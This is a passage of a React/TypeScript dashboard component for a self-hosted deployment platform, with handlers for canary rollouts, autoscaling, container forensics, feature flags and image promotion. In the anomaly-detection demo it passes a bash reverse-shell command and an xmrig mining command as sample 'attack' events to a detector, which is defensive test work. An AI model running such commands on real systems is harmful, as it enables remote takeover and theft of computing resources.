          ([k, v]) => `${k}=${/secret|token|pass|url|key/i.test(k) ? '••••••••' : v}`
        );
      } else if (cmd === 'uptime') {
        out = [' 13:24:08 up 42 days,  6:14,  1 user,  load average: 0.14, 0.11, 0.09'];
      } else if (cmd === 'whoami') {
        out = ['node (uid=1000 gid=1000 non-root)'];
      } else if (cmd === 'pwd') {
        out = ['/app'];
      } else if (cmd.startsWith('uname')) {
        out = ['Linux culkibo-container 6.8.0-49-generic x86_64 GNU/Linux'];
      } else if (cmd === 'ps' || cmd === 'ps aux') {
        out = ['PID  RSS    CMD', '  1  48MB   node server.js', ' 18   2MB   /bin/sh'];
      } else {
        out = [`${termShell}: executed "${cmd}" (exit 0 · sandbox simulation)`];
      }
      setTermLines((prev) => [...prev.slice(-220), promptLine, ...out]);
      window.requestAnimationFrame(() => termEndRef.current?.scrollIntoView({ block: 'nearest' }));
      return;
    }

    termWsRef.current.send(`${cmd}\n`);
    setTermLines((prev) => [...prev.slice(-220), `$ ${cmd}`]);
    window.requestAnimationFrame(() => termEndRef.current?.scrollIntoView({ block: 'nearest' }));
  };

  const handleDiagnoseBuildLogs = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!healLogs.trim()) return;
    setHealLoading(true);
    setHealError(null);
    setHealApplyResult(null);
    try {
      const res = await api.diagnoseBuildLogs(project.id, { logs: healLogs });
      setHealDiagnosis(res);
    } catch (err: unknown) {
      setHealError(err instanceof Error ? err.message : 'Build Auto-Healer unavailable');
    } finally {
      setHealLoading(false);
    }
  };

  const handleDryRunHeal = async () => {
    setHealApplying(true);
    setHealError(null);
    try {
      const res = await api.applyBuildHeal(project.id, {
        logs: healLogs,
        code: healDiagnosis?.primary?.code,
        dryRun: true,
      });
      setHealApplyResult(res);
    } catch (err: unknown) {
      setHealError(err instanceof Error ? err.message : 'Could not compute dry-run heal plan');
    } finally {
      setHealApplying(false);
    }
  };

  const handleRunDriftCheck = async () => {
    setDriftLoading(true);
    setDriftError(null);
    try {
      const res = await api.checkProjectDrift(project.id);
      setDriftReport(res);
    } catch (err: unknown) {
      setDriftError(err instanceof Error ? err.message : 'Config drift check unavailable');
    } finally {
      setDriftLoading(false);
    }
  };

  const handleLoadCanary = async () => {
    setCanaryBusy('load');
    setCanaryError(null);
    try {
      const res = await api.listSloCanaries(project.id);
      const list = Array.isArray(res?.rollouts) ? res.rollouts : [];
      setCanaryRollout(list[0] || null);
    } catch (err: unknown) {
      setCanaryError(err instanceof Error ? err.message : 'Could not load SLO canary status');
    } finally {
      setCanaryBusy(null);
    }
  };

  const handleStartCanary = async () => {
    setCanaryBusy('start');
    setCanaryError(null);
    try {
      const host = project.domains?.[0] || `${project.name}.local`;
      const basePort = project.citadelPort || project.containerPort || 3000;
      const res = await api.startSloCanary(project.id, {
        hostname: host,
        stableUpstream: `127.0.0.1:${basePort}`,
        canaryUpstream: `127.0.0.1:${basePort + 1}`,
        steps: [10, 25, 50, 100],
        sloTarget: 0.999,
        maxBurnRate: 14.4,
      });
      setCanaryRollout(res);
      onNotify(`SLO Canary started at ${res.canaryWeight}% weight (Caddy weighted_round_robin)`, 'success');
    } catch (err: unknown) {
      setCanaryError(err instanceof Error ? err.message : 'Could not start SLO canary');
    } finally {
      setCanaryBusy(null);
    }
  };

  const handleEvaluateCanary = async (mode: 'advance' | 'spike') => {
    if (!canaryRollout) return;
    setCanaryBusy(mode);
    setCanaryError(null);
    try {
      const payload = mode === 'spike'
        ? { totalRequests: 1000, error5xxCount: 45, baselineP95Ms: 18, canaryP95Ms: 92 }
        : { totalRequests: 1000, error5xxCount: 0, baselineP95Ms: 18, canaryP95Ms: 19 };
      const res = await api.evaluateSloCanary(project.id, canaryRollout.id, payload);
      const next: SloCanaryRollout = res.rollout
        ? res.rollout
        : res.id
          ? (res as unknown as SloCanaryRollout)
          : {
              ...canaryRollout,
              status: res.status || (res.breached ? 'ROLLED_BACK' : canaryRollout.status),
              canaryWeight: res.canaryWeight ?? (res.breached ? 0 : canaryRollout.canaryWeight),
              stableWeight: res.stableWeight ?? (100 - (res.canaryWeight ?? (res.breached ? 0 : canaryRollout.canaryWeight))),
              lastBurnRate: res.burnRate,
              breachReasons: res.breachReasons || [],
              evaluations: res.evaluations ?? canaryRollout.evaluations,
            };
      setCanaryRollout(next);
      if (next.status === 'ROLLED_BACK') {
        onNotify('SLO burn-rate breached — instant 100/0 Caddy auto-rollback triggered!', 'error');
      } else if (next.status === 'PROMOTED') {
        onNotify('SLO Canary passed all gates — promoted to 100% production traffic!', 'success');
      } else {
        onNotify(`Healthy step verified — canary weight shifted to ${next.canaryWeight}%`, 'success');
      }
    } catch (err: unknown) {
      setCanaryError(err instanceof Error ? err.message : 'Could not evaluate SLO canary');
    } finally {
      setCanaryBusy(null);
    }
  };

  const handleAbortCanary = async () => {
    if (!canaryRollout) return;
    setCanaryBusy('abort');
    setCanaryError(null);
    try {
      const res = await api.abortSloCanary(project.id, canaryRollout.id, 'operator_manual_abort');
      setCanaryRollout(res);
      onNotify('SLO Canary manually aborted — restored 100/0 stable weights', 'info');
    } catch (err: unknown) {
      setCanaryError(err instanceof Error ? err.message : 'Could not abort SLO canary');
    } finally {
      setCanaryBusy(null);
    }
  };

  const handleLoadAutoscaler = async () => {
    setAutoBusy('load');
    setAutoError(null);
    try {
      const pol = await api.getProjectAutoscaler(project.id);
      if (pol && typeof pol.minReplicas === 'number') setAutoPolicy(pol);
    } catch (err: unknown) {
      setAutoError(err instanceof Error ? err.message : 'Could not load autoscaler policy');
    } finally {
      setAutoBusy(null);
    }
  };

  const handleSaveAutoscaler = async () => {
    setAutoBusy('save');
    setAutoError(null);
    try {
      const safeUp = Math.max(autoPolicy.scaleDownQueueThreshold + 1, autoPolicy.scaleUpQueueThreshold);
      const safeBreaker = Math.max(safeUp, autoPolicy.breakerQueueThreshold);
      const normalized = {
        ...autoPolicy,
        maxReplicas: Math.max(autoPolicy.minReplicas, autoPolicy.maxReplicas),
        scaleUpQueueThreshold: safeUp,
        breakerQueueThreshold: safeBreaker,
      };
      const saved = await api.saveProjectAutoscaler(project.id, normalized);
      if (saved && typeof saved.minReplicas === 'number') setAutoPolicy(saved);
      onNotify('Worker autoscaler policy saved (RAM ceiling + breaker armed)', 'success');
    } catch (err: unknown) {
      setAutoError(err instanceof Error ? err.message : 'Could not save autoscaler policy');
    } finally {
      setAutoBusy(null);
    }
  };

  const handleEvaluateAutoscaler = async (overrideQueue?: number, overrideFreeRam?: number) => {
    setAutoBusy('eval');
    setAutoError(null);
    try {
      const q = overrideQueue ?? (Number(autoQueueDepth) || 0);
      const ram = overrideFreeRam ?? (Number(autoHostFreeRam) || 1600);
      if (overrideQueue !== undefined) setAutoQueueDepth(String(overrideQueue));
      if (overrideFreeRam !== undefined) setAutoHostFreeRam(String(overrideFreeRam));
      const res = await api.evaluateProjectAutoscaler(project.id, {
        queueDepth: q,
        currentReplicas: 1,
        hostFreeRamMb: ram,
        perReplicaRamMb: autoPolicy.perReplicaRamMb,
      });
      setAutoEval(res);
      if (res.circuitBreaker?.state === 'OPEN') {
        onNotify(`Backpressure Circuit Breaker OPEN — HTTP 503 Retry-After: ${res.circuitBreaker.retryAfterSec ?? 15}s`, 'error');
      } else {
        onNotify(`Autoscaler: ${res.action} (${res.currentReplicas} → ${res.targetReplicas}, maxSafe=${res.maxSafeReplicas})`, 'success');
      }
    } catch (err: unknown) {
      setAutoError(err instanceof Error ? err.message : 'Could not evaluate autoscaler');
    } finally {
      setAutoBusy(null);
    }
  };

  const handleRunOomForensics = async (preset: 'oom' | 'sigkill' | 'stale') => {
    setOomBusy(true);
    setOomError(null);
    try {
      const payload =
        preset === 'oom'
          ? { containerName: project.name, exitCode: 137, oomKilled: true, restartCount: 3, memoryLimitMb: 512, memoryPeakMb: 512, cgroupOomKills: 2, recentLogs: 'Out of memory: Killed process (node)' }
          : preset === 'sigkill'
            ? { containerName: project.name, exitCode: 137, oomKilled: false, restartCount: 1, memoryLimitMb: 512, memoryPeakMb: 190, cgroupOomKills: 0, recentLogs: 'Graceful shutdown exceeded 10s stop timeout' }
            : { containerName: project.name, exitCode: 137, oomKilled: true, restartCount: 0, memoryLimitMb: 512, historicalOnly: true, recentLogs: 'Previous completed deployment task exited 2d ago' };
      const res = await api.classifyProjectForensics(project.id, payload);
      setOomResult(res);
      onNotify(
        res.ignoreForRollback
          ? `Forensics: ${res.classification} (ignored for rollback — zero false alerts!)`
          : `Forensics: ${res.classification} (${res.severity}${res.recommendedMemoryMb ? ` · recommend ${res.recommendedMemoryMb} MB` : ''})`,
        res.ignoreForRollback ? 'success' : 'info'
      );
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Container forensics failed';
      setOomError(msg);
      onNotify(msg, 'error');
    } finally {
      setOomBusy(false);
    }
  };

  const handleAuditImageBloat = async (overrideDockerfile?: string) => {
    const df = (overrideDockerfile ?? auditDockerfileText).trim();
    if (!df) return;
    if (overrideDockerfile !== undefined) setAuditDockerfileText(overrideDockerfile);
    setImageAuditBusy(true);
    setImageAuditError(null);
    try {
      const res = await api.auditImageBloat({ dockerfile: df, stack: 'node' });
      setImageAuditResult(res);
      const leaks = Array.isArray(res.secretLeaks) ? res.secretLeaks.length : 0;
      onNotify(
        leaks > 0
          ? `Image Auditor flagged ${leaks} secret leak(s) · score ${res.efficiencyScore}/100`
          : `Image Efficiency Score: ${res.efficiencyScore}/100 (est. ${res.estimatedSavingsMb} MB savings)`,
        leaks > 0 ? 'error' : 'success'
      );
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Dockerfile bloat audit failed';
      setImageAuditError(msg);
      onNotify(msg, 'error');
    } finally {
      setImageAuditBusy(false);
    }
  };

  const handleAuditEgressFirewall = async () => {
    setEgressBusy(true);
    setEgressError(null);
    try {
      const res = await api.auditProjectEgress(project.id, {
        backend: 'nftables',
        observedSockets: [
          { ip: '169.254.169.254', host: '169.254.169.254', port: 80, proto: 'tcp' },
          { ip: '10.0.0.15', host: '10.0.0.15', port: 5432, proto: 'tcp' },
        ],
        firewallRules: [],
      });
      setEgressResult(res);
      const vCount = Array.isArray(res.violations) ? res.violations.length : 0;
      onNotify(
        res.compliant
          ? `Egress Firewall compliant (riskScore ${res.riskScore}/100 · SSH/80/443 preserved)`
          : `Egress Auditor flagged ${vCount} violation(s) (riskScore ${res.riskScore}/100 · nftables fix generated)`,
        res.compliant ? 'success' : 'error'
      );
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Egress firewall audit failed';
      setEgressError(msg);
      onNotify(msg, 'error');
    } finally {
      setEgressBusy(false);
    }
  };

  const handleVerifyMultiArch = async () => {
    setMultiArchBusy('verify');
    setMultiArchError(null);
    try {
      const res = await api.verifyMultiArchManifest({
        imageArch: 'arm64',
        hostArch: 'amd64',
        manifestPlatforms: ['linux/arm64'],
        strictOciRegistry: true,
        includeAttestations: true,
      });
      setMultiArchVerify(res);
      onNotify(
        res.compatible
          ? 'OCI Manifest compatible with host architecture'
          : `Pre-Deploy Guard: ${res.code || 'EXEC_FORMAT_MISMATCH'} (arm64 image on amd64 host blocked!)`,
        res.compatible ? 'success' : 'error'
      );
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Multi-arch verification failed';
      setMultiArchError(msg);
      onNotify(msg, 'error');
    } finally {
      setMultiArchBusy(null);
    }
  };

  const handlePlanMultiArchMatrix = async () => {
    setMultiArchBusy('plan');
    setMultiArchError(null);
    try {
      const res = await api.planMultiArchBuild({
        targetPlatforms: ['linux/amd64', 'linux/arm64'],
        builders: [
          { id: 'hetzner-x86-fsn1', name: 'hetzner-x86-fsn1', arch: 'amd64', host: '91.107.194.22' },
          { id: 'ampere-arm-hel1', name: 'ampere-arm-hel1', arch: 'arm64', host: '95.217.44.18' },
        ],
        preferNativeOverQemu: true,
        imageTag: `culkibo/${project.name}:latest`,
      });
      setMultiArchPlan(res);
      onNotify(
        res.usesQemu
          ? 'Multi-arch build matrix planned (QEMU fallback required)'
          : 'Native Fleet Build Matrix planned (amd64 + arm64 · 0 QEMU emulation!)',
        'success'
      );
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Multi-arch planning failed';
      setMultiArchError(msg);
      onNotify(msg, 'error');
    } finally {
      setMultiArchBusy(null);
    }
  };

  const handleRunChaosGameDay = async (mode: 'prod' | 'abort' | 'healthy') => {
    setChaosBusy(mode);
    setChaosError(null);
    try {
      const payload =
        mode === 'prod'
          ? { environment: 'production', explicitProdConfirm: false, faultType: 'latency_jitter', latencyMs: 300, dryRun: true }
          : mode === 'abort'
            ? { environment: 'staging', faultType: 'http_5xx', faultRatePct: 28, maxErrorAbortPct: 15, recoverySec: 45, sloP95Ms: 400, dryRun: true }
            : { environment: 'staging', faultType: 'latency_jitter', latencyMs: 180, jitterMs: 25, faultRatePct: 0.4, maxErrorAbortPct: 15, recoverySec: 8, sloP95Ms: 400, dryRun: true };
      const res = await api.simulateProjectChaos(project.id, payload);
      setChaosResult(res);
      if (res.blocked || res.code === 'PROD_CHAOS_CONFIRM_REQUIRED') {
        onNotify('Production Chaos Safety Lock engaged: PROD_CHAOS_CONFIRM_REQUIRED', 'error');
      } else if (res.aborted || res.status === 'AUTO_ABORTED') {
        onNotify('Staging GameDay AUTO_ABORTED: error rate breached safety threshold!', 'error');
      } else {
        onNotify(`Healthy GameDay PASS: Resilience Score ${res.resilienceScore ?? 94}/100 (Grade ${res.grade || 'A'})`, 'success');
      }
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Chaos GameDay simulation failed';
      setChaosError(msg);
      onNotify(msg, 'error');
    } finally {
      setChaosBusy(null);
    }
  };

  const handleLoadFlags = async () => {
    setFlagBusy('load');
    setFlagError(null);
    try {
      const res = await api.listFeatureFlags();
      setFlagsList(Array.isArray(res?.flags) ? res.flags : []);
    } catch (err: unknown) {
      setFlagError(err instanceof Error ? err.message : 'Could not load feature flags');
    } finally {
      setFlagBusy(null);
    }
  };

  const handleEvaluateFlag = async (key: string) => {
    setFlagBusy(`eval-${key}`);
    setFlagError(null);
    try {
      const res = await api.evaluateFeatureFlag(key, { subjectId: 'user_42', tenantId: 'acme-pro', environment: 'prod' });
      setFlagEval(res);
      onNotify(`Flag "${key}" → ${res.enabled ? 'ENABLED' : 'OFF'} (${res.reason}${res.bucket != null ? ` · bucket ${res.bucket}%` : ''})`, res.enabled ? 'success' : 'info');
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Flag evaluation failed';
      setFlagError(msg);
      onNotify(msg, 'error');
    } finally {
      setFlagBusy(null);
    }
  };

  const handleKillFlag = async (key: string) => {
    setFlagBusy(`kill-${key}`);
    setFlagError(null);
    try {
      await api.killFeatureFlag(key, 'emergency_kill');
      setFlagsList((prev) => prev.map((f) => (f.key === key ? { ...f, killed: true, enabled: false } : f)));
      const ev = await api.evaluateFeatureFlag(key, { subjectId: 'user_42', tenantId: 'acme-pro', environment: 'prod' }).catch(() => null);
      if (ev) setFlagEval(ev);
      onNotify(`Emergency Kill-Switch activated on "${key}" (KILL_SWITCH_ACTIVE · 0 redeploys)`, 'error');
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Kill-switch failed';
      setFlagError(msg);
      onNotify(msg, 'error');
    } finally {
      setFlagBusy(null);
    }
  };

  const handleInspectAnomalies = async (mode: 'attack' | 'clean') => {
    setAnomalyBusy(mode);
    setAnomalyError(null);
    try {
      const events = mode === 'attack'
        ? [
            { type: 'process', cmd: 'xmrig -o stratum+tcp://pool.minexmr.com:3333 -u wallet' },
            { type: 'process', cmd: 'bash -i >& /dev/tcp/198.51.100.77/4444 0>&1' },
          ]
        : [
            { type: 'process', cmd: 'node /app/server.js --port 3000' },
            { type: 'http', path: '/health', status: 200 },
          ];
      const res = await api.inspectProjectAnomalies(project.id, { containerName: project.name, events, persist: true });
      setAnomalyResult(res);
      onNotify(
        res.clean
          ? 'Runtime Anomaly Guard: CLEAN · 0 ALERTS (riskScore 0/100)'
          : `Runtime Anomaly Guard BLOCKED (${Array.isArray(res.alerts) ? res.alerts.length : 2} critical threat(s) · riskScore ${res.riskScore}/100)`,
        res.clean ? 'success' : 'error'
      );
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Runtime anomaly inspection failed';
      setAnomalyError(msg);
      onNotify(msg, 'error');
    } finally {
      setAnomalyBusy(null);
    }
  };

  const handleRunDigestPromotion = async (mode: 'latest' | 'self' | 'sha') => {
    setPromoBusy(mode);
    setPromoError(null);
    const sha64 = 'a3f5c8e1b9d20476a3f5c8e1b9d20476a3f5c8e1b9d20476a3f5c8e1b9d20476';
    const prevSha64 = '91b0d4c2e8a7531091b0d4c2e8a7531091b0d4c2e8a7531091b0d4c2e8a75310';
    try {
      if (mode === 'latest') {
        const res = await api.createProjectPromotion(project.id, {
          imageRef: `ghcr.io/acme/${project.name}:latest`,
          fromEnv: 'staging',
          toEnv: 'prod',
          sourceEnvKeys: ['DATABASE_URL'],
          targetEnvKeys: ['DATABASE_URL'],
          requester: 'alice@acme.dev',
          requireDualControl: true,
        });
        setPromoResult(res);
        onNotify(`Immutable Guard BLOCKED: ${res.code || 'MUTABLE_TAG_FORBIDDEN'}`, 'error');
        return;
      }
      const created = await api.createProjectPromotion(project.id, {
        imageRef: `ghcr.io/acme/${project.name}@sha256:${sha64}`,
        fromEnv: 'staging',
        toEnv: 'prod',
        sourceEnvKeys: ['DATABASE_URL', 'REDIS_URL'],
        targetEnvKeys: ['DATABASE_URL', 'REDIS_URL'],
        requester: 'alice@acme.dev',
        requireDualControl: true,
        previousDigest: `ghcr.io/acme/${project.name}@sha256:${prevSha64}`,
      });
      const promoId = created.promotion?.id || 'promo_demo_1';
      if (mode === 'self') {
        const res = await api.approveProjectPromotion(project.id, promoId, { approver: 'alice@acme.dev', comment: 'self-approve attempt' });
        setPromoResult(res);
        onNotify(`Dual-Control Guard BLOCKED: ${res.code || 'DUAL_CONTROL_VIOLATION'}`, 'error');
        return;
      }
      await api.approveProjectPromotion(project.id, promoId, { approver: 'bob@acme.dev', comment: 'peer-reviewed digest match' });
      const execRes = await api.executeProjectPromotion(project.id, promoId, { dryRun: true });
      setPromoResult(execRes);
      onNotify('Immutable @sha256: promotion planned (staging → prod · dryRun + rollback manifest ready)', 'success');
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Digest promotion failed';
      setPromoError(msg);
      onNotify(msg, 'error');
    } finally {
      setPromoBusy(null);
    }
  };

  const handleRunApiContractDiff = async (mode: 'breaking' | 'major') => {
    setContractBusy(mode);
    setContractError(null);
    try {
      const baseSpec = {
        openapi: '3.1.0',
        info: { title: `${project.name} API`, version: '1.4.0' },
        paths: {
          '/v1/orders': { get: { security: [{ bearerAuth: [] }], responses: { '200': { description: 'OK' } } } },
          '/v1/billing/invoices': { get: { security: [{ bearerAuth: [] }], responses: { '200': { description: 'OK' } } } },
        },
      };
      const revisionSpec = {
        openapi: '3.1.0',
        info: { title: `${project.name} API`, version: mode === 'major' ? '2.0.0' : '1.5.0' },
        paths: {
          '/v1/orders': { get: { responses: { '200': { description: 'OK' } } } },
        },
      };
      const res = await api.diffApiContract({ format: 'openapi', baseSpec, revisionSpec });
      setContractResult(res);
      onNotify(
        res.allowed
          ? `API Contract Gate ALLOWED (${res.baseVersion || '1.4.0'} → ${res.revisionVersion || '2.0.0'} · SAFE MAJOR BUMP)`
          : `API Contract Gate BLOCKED (${res.code || 'MISSING-VERSION-BUMP'} · ${res.breakingCount ?? 2} breaking change(s))`,
        res.allowed ? 'success' : 'error'
      );
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'API contract diff failed';
      setContractError(msg);
      onNotify(msg, 'error');
    } finally {
      setContractBusy(null);
    }
  };

  const toggleCockpit = (panel: 'slsa' | 'migration' | 'wasm' | 'timemachine' | 'shadow' | 'terminal' | 'healer' | 'drift' | 'canary' | 'autoscaler' | 'forensics') => {
    const next = activeCockpit === panel ? null : panel;
    setActiveCockpit(next);
    if (next === 'timemachine' && tmCheckpoints.length === 0 && !tmLoading) {
      void handleLoadTimeMachine();
    }
    if (next === 'terminal' && isDemoMode() && !termConnected && !termConnecting) {
      void handleConnectTerminal();
    }
    if (next === 'drift' && !driftReport && !driftLoading) {
      void handleRunDriftCheck();
    }
    if (next === 'canary' && !canaryRollout && canaryBusy === null) {
      void handleLoadCanary();
    }
    if (next === 'autoscaler' && autoBusy === null) {
      void handleLoadAutoscaler();
    }
  };

  const tabGroups: Array<{
    group: string;
    items: Array<{ id: ProjectTabId; label: string; icon: React.ComponentType<{ className?: string }>; count?: number }>;
  }> = [
    {
      group: 'ops',
      items: [
        { id: 'general', label: t('pd.tabGeneral'), icon: LayoutGrid },
        { id: 'deployments', label: t('pd.tabDeployments'), icon: Rocket },
        { id: 'live', label: t('pd.tabLive'), icon: Zap },
        { id: 'logs', label: t('pd.tabLogs'), icon: ScrollText },
      ],
    },
    {
      group: 'infra',
      items: [
        { id: 'domains', label: t('pd.tabDomains'), icon: Globe, count: domainCount },
        { id: 'databases', label: t('pd.tabDatabases'), icon: Database, count: dbCount },
        { id: 'storage', label: t('pd.tabStorage'), icon: Box },
      ],
    },
    {
      group: 'settings',
      items: [
        { id: 'vars', label: t('pd.tabVars'), icon: Variable, count: envCount },
        { id: 'config', label: t('pd.tabConfig'), icon: Settings },
      ],
    },
  ];

  const handleToggleMaintenance = async () => {
    const nextEnabled = !project.maintenanceMode;
    setTogglingMaintenance(true);
    try {
      const res = await api.toggleMaintenance(project.id, nextEnabled);
      if (res.project) setProject(res.project);
      else await fetchProject();
      onNotify(
        nextEnabled
          ? 'Modo mantenimiento activado (<10 ms en Caddy): el tráfico público recibe 503.'
          : 'Modo mantenimiento desactivado: tráfico restaurado en Caddy.',
        nextEnabled ? 'info' : 'success'
      );
      onProjectUpdate?.();
    } catch (e: any) {
      onNotify(e?.message || 'No se pudo cambiar el modo mantenimiento', 'error');
    } finally {
      setTogglingMaintenance(false);
    }
  };

  const monogramWords = (project.name || 'PR').replace(/[^a-zA-Z0-9\s-]/g, ' ').split(/[\s-]+/).filter(Boolean);
  const monogram = monogramWords.length >= 2
    ? `${monogramWords[0][0]}${monogramWords[1][0]}`.toUpperCase()
    : (monogramWords[0] || 'PR').slice(0, 2).toUpperCase();

  return (
    <div className="space-y-5">
      {/* Cabecera limpia en 2 filas: identidad + acciones primarias arriba, Cockpit Toolbar abajo */}
      <div className="flex flex-col gap-3.5">
        <div className="flex flex-col sm:flex-row sm:items-start justify-between gap-3">
          <div className="flex items-start gap-3 min-w-0 flex-1">
            <button
              type="button"
              onClick={onBack}
              aria-label={t('pd.backProjects')}
              className="mt-1 p-2 rounded-lg border border-slate-200 bg-white text-slate-500 hover:text-slate-900 hover:bg-slate-50 transition-colors cursor-pointer shrink-0"
              title={t('pd.backProjects')}
            >
              <ArrowLeft className="w-4 h-4" />
            </button>
            <span
              aria-hidden="true"
              className="mt-0.5 w-10 h-10 rounded-lg bg-slate-900 text-white font-mono text-xs font-semibold flex items-center justify-center shrink-0"
            >
              {monogram}
            </span>
            <div className="min-w-0 flex-1">
              <div className="flex items-center gap-2 flex-wrap">
                <h1 className="text-2xl font-semibold text-slate-900 tracking-tight break-words">{project.name}</h1>
                <span
                  className={`inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full text-[11px] font-medium border shrink-0 ${
                    project.maintenanceMode
                      ? 'bg-amber-50 text-amber-800 border-amber-200'
                      : project.lastDeployedAt && project.status === 'active'
                        ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                        : project.localRunning
                          ? 'bg-amber-50 text-amber-800 border-amber-200'
                          : 'bg-slate-100 text-slate-600 border-slate-200'
                  }`}
                >
                  <span className={`w-1.5 h-1.5 rounded-full ${
                    project.maintenanceMode
                      ? 'bg-amber-500'
                      : project.lastDeployedAt && project.status === 'active'
                        ? 'bg-emerald-500'
                        : project.localRunning
                          ? 'bg-amber-500'
                          : 'bg-slate-400'
                  }`} />
                  {project.maintenanceMode
                    ? t('pd.statusMaint')
                    : project.lastDeployedAt && project.status === 'active'
                      ? t('pd.statusProd')
                      : project.localRunning
                        ? `${t('pd.statusLocal')}${project.localPort ? ` :${project.localPort}` : ''}`
                        : project.status === 'hibernated'
                          ? t('pd.statusHibernated')
                          : project.status === 'stopped'
                            ? t('pd.statusStopped')
                            : t('pd.statusNotStarted')}
                </span>
              </div>
              <p className="text-xs text-slate-500 mt-1 leading-relaxed">
                {project.description || t('pd.noDesc')}
                {project.lastDeployedAt && (
                  <span className="ml-2 text-slate-400 tabular-nums whitespace-nowrap">
                    · {t('pd.lastDeploy')} {new Date(project.lastDeployedAt).toLocaleDateString(locale === 'es' ? 'es-ES' : 'en-US')}
                  </span>
                )}
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2 flex-wrap shrink-0">
            {project.maintenanceMode && (
              <button
                type="button"
                onClick={() => void handleToggleMaintenance()}
                disabled={togglingMaintenance}
                className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium bg-amber-50 hover:bg-amber-100 text-amber-900 border border-amber-300 transition-colors cursor-pointer disabled:opacity-50"
              >
                <PauseCircle className="w-3.5 h-3.5 text-amber-600" />
                {t('pd.exitMaint')}
              </button>
            )}

            {project.localRunning && project.localPort ? (
              <a
                href={`http://${previewHost}:${project.localPort}`}
                target="_blank"
                rel="noreferrer"
                className="inline-flex items-center gap-1.5 bg-amber-50 hover:bg-amber-100 text-amber-800 px-3 py-2 rounded-lg text-xs font-medium border border-amber-200 tabular-nums"
              >
                <Globe className="w-3.5 h-3.5 text-amber-600" /> {t('pd.openPort')} :{project.localPort}
              </a>
            ) : (
              <button
                type="button"
                onClick={handleStart}
                disabled={loading}
                className="inline-flex items-center gap-1.5 bg-slate-900 hover:bg-slate-800 text-white px-3.5 py-2 rounded-lg text-xs font-medium transition-colors cursor-pointer disabled:opacity-50"
              >
                <Play className="w-3.5 h-3.5" /> {t('pd.startLocal')}
              </button>
            )}

            {project.localRunning ? (
              <button
                type="button"
                onClick={handleStop}
                disabled={loading}
                className="inline-flex items-center gap-1.5 bg-red-50 hover:bg-red-100 text-red-700 border border-red-200 px-3 py-2 rounded-lg text-xs font-medium transition-colors cursor-pointer disabled:opacity-50"
              >
                <Square className="w-3 h-3 fill-red-600 text-red-600" /> {t('pd.stop')}
              </button>
            ) : project.status !== 'active' ? (
              <button
                type="button"
                onClick={handleActivate}
                disabled={loading}
                className="inline-flex items-center gap-1.5 bg-white hover:bg-slate-50 text-slate-700 border border-slate-200 px-3 py-2 rounded-lg text-xs font-medium transition-colors cursor-pointer disabled:opacity-50"
              >
                <Power className="w-3.5 h-3.5 text-emerald-600" /> {t('pd.activate')}
              </button>
            ) : null}

            {project.domains && project.domains.length > 0 && (
              <a
                href={`https://${project.domains[0]}`}
                target="_blank"
                rel="noreferrer"
                className="inline-flex items-center gap-1.5 bg-white hover:bg-slate-50 text-slate-700 border border-slate-200 px-3 py-2 rounded-lg text-xs font-medium transition-colors"
              >
                <Globe className="w-3.5 h-3.5 text-slate-500" /> {t('pd.openSite')}
              </a>
            )}

            {/* Menú Más: Mantenimiento, Hibernar, Detener */}
            <div className="relative" ref={moreMenuRef}>
              <button
                type="button"
                onClick={() => setMoreMenuOpen((v) => !v)}
                aria-expanded={moreMenuOpen}
                aria-haspopup="menu"
                aria-label="More project actions"
                className="inline-flex items-center gap-1.5 bg-white hover:bg-slate-50 text-slate-700 border border-slate-200 px-2.5 py-2 rounded-lg text-xs font-medium transition-colors cursor-pointer"
              >
                <MoreHorizontal className="w-4 h-4" />
              </button>
              {moreMenuOpen && (
                <div
                  role="menu"
                  className="culkibo-modal-enter absolute right-0 mt-1.5 w-56 bg-white border border-slate-200 rounded-xl shadow-lg py-1.5 z-40"
                >
                  <button
                    type="button"
                    role="menuitem"
                    onClick={() => { setMoreMenuOpen(false); void handleToggleMaintenance(); }}
                    disabled={togglingMaintenance}
                    className="w-full px-3.5 py-2 text-left text-xs text-slate-700 hover:bg-slate-50 flex items-center gap-2 cursor-pointer disabled:opacity-50"
                  >
                    <PauseCircle className="w-3.5 h-3.5 text-amber-600 shrink-0" />
                    <span>{project.maintenanceMode ? t('pd.exitMaint') : t('pd.menuMaintOn')}</span>
                  </button>
                  {project.status === 'active' && (
                    <button
                      type="button"
                      role="menuitem"
                      onClick={() => { setMoreMenuOpen(false); void handleHibernate(); }}
                      disabled={loading}
                      className="w-full px-3.5 py-2 text-left text-xs text-slate-700 hover:bg-slate-50 flex items-center gap-2 cursor-pointer disabled:opacity-50"
                    >
                      <Moon className="w-3.5 h-3.5 text-slate-500 shrink-0" />
                      <span>{t('pd.menuHibernate')}</span>
                    </button>
                  )}
                  {(project.status === 'active' || project.localRunning) && (
                    <button
                      type="button"
                      role="menuitem"
                      onClick={() => { setMoreMenuOpen(false); void handleStop(); }}
                      disabled={loading}
                      className="w-full px-3.5 py-2 text-left text-xs text-red-700 hover:bg-red-50 flex items-center gap-2 cursor-pointer disabled:opacity-50"
                    >
                      <Square className="w-3 h-3 fill-red-600 text-red-600 shrink-0" />
                      <span>{t('pd.menuStop')}</span>
                    </button>
                  )}
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Dedicated Pioneer Cockpit Action Toolbar (never collides with title/description) */}
        <div className="flex items-center gap-1.5 flex-wrap" role="toolbar" aria-label="Project cockpit tools">
          <button
            type="button"
            onClick={handleToggleSmartPack}
            className={`culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors cursor-pointer ${
              smartPackOpen
                ? 'bg-slate-900 text-white border-slate-900'
                : 'bg-white hover:bg-slate-50 text-slate-700 border-slate-200'
            }`}
          >
